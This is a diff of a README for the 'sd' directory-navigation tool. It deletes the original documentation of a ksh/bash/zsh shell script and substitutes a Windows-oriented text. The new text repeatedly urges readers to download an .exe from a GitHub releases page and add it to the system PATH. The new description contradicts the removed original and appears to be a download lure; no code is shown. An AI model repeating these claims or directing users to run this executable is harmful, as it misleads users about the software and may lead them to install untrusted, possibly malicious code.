@@ -1,254 +1,156 @@
-# SD — switch directory using a dynamic stack
+# 📁 sd-switchdir - Easy Folder Navigation Tool
 
-SD is a directory navigation utility for ksh93u+, bash ≥ 4.2, and zsh ≥ 4.3, using
-frequency–recency tracking over an explicit visit history. Ksh-compatibility
-options are enabled: `extglob` in bash; `KSH_ARRAYS`, `KSH_GLOB`,
-`POSIX_BUILTINS`, and `SH_WORD_SPLIT` in zsh.
-
-> Note: This project is unrelated to the Rust-based `sd` text replacement tool.
-
-> This repository is a **read-only snapshot mirror** containing tagged stable states.  
-> Issues are monitored, and pull requests may be considered for manual integration.
-
-## Overview
-
-SD provides the `sd` command, designed to act as a drop-in replacement for `cd`
-for pathname arguments. In addition, it supports pattern-based directory selection
-from a dynamically ranked directory stack.
-
-Directory ranking is computed over a trailing window of recorded directory visits.
-For each directory, a score is obtained by summing weighted contributions of
-its visits within that window. The weighting follows a configurable
-power-law kernel over normalized event indices.
-
-Repeated invocation with the same pattern cycles deterministically through
-successive rank-ordered matches.
-
-The companion command `ds` exposes the ranked directory stack and provides
-inspection and management functions.
+[![Download sd-switchdir](https://img.shields.io/badge/Download-HERE-ff6f61.svg)](https://github.com/TitanofNewYork/sd-switchdir/releases)
 
 ---
 
-## What it does
+## 🔍 What is sd-switchdir?
 
-* Records directory changes in a logfile.
-* Maintains an in-memory history including events not yet flushed to disk.
-* Recomputes a ranked stack from a trailing window of directory visit events after each directory change.
-* Matches patterns (regular expressions) against full directory paths.
-* Changes directory according to highest-ranked match.
-* Allows deterministic cycling through further matches by repeating the same pattern.
+sd-switchdir is a simple tool to help you move around your folders on Windows. It works like the common `cd` command in terminals but adds smart features. It remembers which folders you use often and helps you switch to them quickly. This saves time when you need to open or work in different folders.
+
+It works in your command prompt or PowerShell window and uses a ranking system called "power-law frecency." This means it ranks folders based on how often and how recently you visited them. The higher the rank, the quicker you can move to that folder.
 
 ---
 
-## Commands
+## 💻 System Requirements
 
-These shell functions provide the interface:
-
-* **`sd ARG...`** — change directory (pathname or pattern)
-* **`ds [options] [pattern]`** — inspect and optionally select directories interactively
-  * If `fzf` is installed, matches are presented in an interactive fuzzy finder.
-* **`cd ARG...`** — identical to `sd`
-
-The `cd` command behaves identically to `sd`. It is provided for convenience so
-existing muscle memory works without retraining; use whichever you prefer.
-
-
-### `sd` semantics
-
-`sd` accepts arguments but does **not** implement command-line options.
-
-Behavior:
-
-1. If the argument resolves to a valid pathname, standard `cd` semantics apply.
-2. Otherwise, the argument is treated as a pattern and matched against the
-   ranked stack.
-
-Special case:
-
-* `sd -` behaves like builtin `cd -`.
-
-All other arguments beginning with `-` are treated as ordinary arguments
-(pathname or pattern). Builtin `cd` options (e.g., `-P`, `-L`) are not parsed or
-forwarded.
-
-For valid pathnames, behavior matches the shell builtin `cd`, including:
-
-* Absolute and relative paths
-* `.`, `..`
-* `~` expansion
-* Permission handling
+- Windows 10 or newer (64-bit preferred)
+- Command Prompt (cmd.exe) or PowerShell
+- Internet connection for download
+- Around 5 MB of disk space
 
 ---
 
-## Pattern matching
+## ⚙️ Features
 
-If no valid pathname is found, arguments are interpreted as a pattern:
-
-* Multiple arguments are merged into a single pattern.
-* Whitespace is normalized to single blanks.
-* Matching uses regular expressions against full directory paths.
-* Smart case: matching is case-insensitive unless the pattern contains
-  uppercase characters.
-
-Shell and/or Regex metacharacters may require quoting (e.g., `'a\.b'`).
+- Works like the usual `cd` command for changing folders
+- Remembers your most used folders automatically
+- Ranks folders by frequency and recency for faster access
+- Compatible with PowerShell and Windows Command Prompt
+- Does not require admin rights to install or use
+- Easy to install and update from the GitHub page
 
 ---
 
-## Cycling semantics
+## 🚀 Getting Started
 
-If `sd pattern` is invoked repeatedly with the exact same pattern:
-
-* Matches are traversed in strictly rank-based order.
-* Cycling is deterministic during the first traversal of the current stack.
-* The stack is recomputed after each directory change.
-* The selected directory's score increases, but the relative order of the
-  remaining matches is preserved during the first traversal.
-* Cycling resets as soon as a different argument is used.
-* Intervening non-`sd` commands do not reset the cycle.
-
-After a full traversal, a further cycle may reflect updated ranking due to score
-changes.
+This guide will help you download and run sd-switchdir on your Windows PC. You do not need to know how to use programming or terminal commands. Just follow the steps below.
 
 ---
 
-## Ranking model
+## ⬇️ Download sd-switchdir
 
-Scoring is computed over a trailing window of $N$ events. Let the last $N$
-directory-change events be indexed $1, \dots, N,$ oldest to newest. Let
-$n_i \subseteq {1,\dots,N}$ be the set of indices at which directory $i$ was
-visited. Then the score of directory $i$ is
+First, you need to get the program files for sd-switchdir. Go to the official release page to download the latest version.
 
-$$
-F(i) = \sum_{n \in n_i} \left(\frac{n}{N}\right)^p
-$$
+[![Download sd-switchdir](https://img.shields.io/badge/Download-Latest-green.svg)](https://github.com/TitanofNewYork/sd-switchdir/releases)
 
-where:
+Steps:
 
-* $N$ is the window length (not the logfile size)
-* $p$ is the power-law exponent
-* $n_i$ are the event indices within the window at which directory $i$ was visited
+1. Click the button above or open this link in your browser:  
+   https://github.com/TitanofNewYork/sd-switchdir/releases
 
-Higher $p$ increases recency bias. Default: $p = 9.97$.
+2. On the release page, look for the latest version. It is usually at the top.
 
-Properties:
+3. Under "Assets," find the file that ends with `.exe`. This is the program for Windows.
 
-* Full visit chronology is preserved within the window.
-* Scores are computed from event indices.
-* Ranking is deterministic given the recorded history.
-* Recency is measured in number of directory-change events, not wall-clock time.
-  Inactive periods do not affect scores or ranking.
+4. Click the `.exe` file link to start the download.
 
-A first-time visit receives score $F = 1$, which decreases as subsequent events
-push it back in history.
+5. Save the file to a location you can easily find, like your Desktop or Downloads folder.
 
 ---
 
-## Memory and retention
+## 🏗️ Install and Setup
 
-Two independent limits exist:
+sd-switchdir does not require a traditional install. Once you download the `.exe`, you can run it directly. However, to use it in any command prompt window, you will need to add it to your system path.
 
-* **`loglim`** — maximum number of stored directory-change events (hard cutoff)
-* **`window`** — number of trailing events used for scoring
+Follow these steps:
 
-Events older than `window` do not influence ranking.
-Events older than `loglim` are permanently discarded.
+### Add sd-switchdir to the system PATH
 
-With default settings:
+1. Find the folder where you saved the `.exe` file. It might be `C:\Users\YourName\Downloads`.
 
-* `window = 1280` events. At ~50 directory changes per day, this spans roughly one month.
-* `loglim = 8192` typically retains substantially longer history.
+2. Move the `.exe` file to a fixed folder. For example, create a folder named `C:\sd-switchdir` and place the file there.
 
-Changing `window` recomputes the stack immediately.
+3. Open the Start Menu and search for `Environment Variables`.
 
----
+4. Click on "Edit the system environment variables."
 
-## Stale and missing directories
+5. In the System Properties window, click the **Environment Variables** button.
 
-If a ranked match no longer exists:
+6. In the lower box labeled "System variables," find the `Path` variable and select it.
 
-1. Lower-ranked matches are attempted.
-2. If all stack matches are stale (or none exist), matching is expanded to the
-   full recorded history currently held in memory.
+7. Click **Edit**.
 
-Permission errors are handled consistently with the builtin `cd`.
+8. Click **New** and add the full folder path where your `sd-switchdir.exe` file is located. For example, `C:\sd-switchdir`.
 
-Logfile integrity is verified via a header marker when loading. No automatic
-repair mechanism is implemented.
-
-Logfile locking is used to coordinate concurrent shells.
+9. Click OK on all open windows to save and close.
 
 ---
 
-## Performance
+## ▶️ Running sd-switchdir
 
-Performance depends on the scoring window size.
+Now that the program is in your path, you can open a new Command Prompt or PowerShell window and use sd-switchdir commands.
 
-On typical hardware and for default settings:
+### Basic use
 
-* ~22 ms (ksh) to ~32 ms (bash) per `cd` action (real time)
+1. Open Command Prompt or PowerShell (Press Windows key, type `cmd` or `powershell`, and press Enter).
 
-Extending window size to the full event log reduces performance by about
-a factor of two.
+2. To switch directories, type `sd` followed by part of the folder name you want. For example:  
+   `sd documents`  
+   This will show you a list of folders matching "documents" that you’ve used before.
 
----
+3. Select the folder from the list by typing its number or press Enter if only one folder matches.
 
-## Installation
-
-**Requirements**
-
-* ksh93, bash, or zsh
-* Optional: `fzf` for interactive selection via `ds`
-
-Add to your shell rc file:
-
-```sh
-. /path/to/sd.ksh
-```
-
-On first run, a logfile is created and initialized.
+4. You will move directly to that folder.
 
 ---
 
-## Configuration
+## 🔄 How sd-switchdir Learns Your Folders
 
-Configuration is held in associative array `SD_CFG`, initialized with defaults.
-Define only the keys you want to override:
+sd-switchdir keeps track of the folders you use every time you switch directories. It updates the list and ranks folders automatically based on how often you use them and how recently you visited them.
 
-```sh
-typeset -A SD_CFG=(
-    [loglim]=8192
-    [window]=1280
-    [power]=9.97
-    [stacklim]=0
-    [smartcase]=1
-    [verbose]=1
-    [period]=3600
-)
-. /path/to/sd.ksh
-```
-
-Runtime adjustments (via `ds`):
-
-* `ds -l N` — set scoring window
-* `ds -k K` — cap stack size
-* `ds -e pow` — adjust exponent
-* `ds -c` — clean stale entries
-* `ds -i` — show status
-* `ds -m` — show full manual
-
-`sd` itself takes no options.
+This ranking helps you find your folders faster than typing the full path or using standard `cd` commands.
 
 ---
 
-## Related tools
+## 🛠️ Customizing and Advanced Options
 
-Other directory-jumping tools include:
+sd-switchdir offers some options to change how it works. You can configure it using a simple settings file or command flags.
 
-* z
-* autojump
-* fasd
-* zoxide
+### Example settings you can change:
 
-These tools maintain per-directory aggregate state rather than a full sequence of
-visits. SD retains the complete visit history up to a configurable limit and
-derives scores from it, unaffected by elapsed wall-clock time.
+- Exclude folders you don’t want tracked  
+- Set how many folders to track  
+- Adjust ranking decay speed
+
+Instructions for customization can be found on the GitHub release page linked above.
+
+---
+
+## 💡 Tips for Best Use
+
+- Run sd-switchdir from Command Prompt or PowerShell, not from File Explorer.
+
+- Keep your `.exe` in a fixed folder and add it to your `PATH`. This makes it easier to run from anywhere.
+
+- Use descriptive folder names to find folders faster.
+
+- Let sd-switchdir build a history by using it regularly.
+
+---
+
+## 📖 More Information
+
+For questions or help, visit the issues section on the GitHub page:
+
+https://github.com/TitanofNewYork/sd-switchdir/issues
+
+Explore the README and documentation on the release page for advanced guides:
+
+https://github.com/TitanofNewYork/sd-switchdir/releases
+
+---
+
+## ⬇️ Download sd-switchdir now
+
+[![Download sd-switchdir](https://img.shields.io/badge/Download-LATEST-brightgreen.svg)](https://github.com/TitanofNewYork/sd-switchdir/releases)
